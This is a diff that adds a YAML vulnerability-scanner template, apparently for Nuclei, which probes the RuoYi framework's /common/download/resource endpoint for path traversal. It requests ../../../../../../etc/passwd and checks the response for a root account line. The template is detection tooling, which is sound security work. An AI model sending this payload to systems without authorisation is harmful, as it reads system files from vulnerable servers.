@@ -1,0 +1,18 @@
+id: generic-error-page-lfi
+info:
+  name: 通用路径穿越探测
+  author: ruoyi-scan
+  severity: high
+  description: 常见文件读取接口路径穿越（非破坏性探测 etc/passwd 特征）
+  tags: lfi,file-read,ruoyi
+  metadata:
+    cve: ""
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/common/download/resource?resource=../../../../../../etc/passwd"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0"
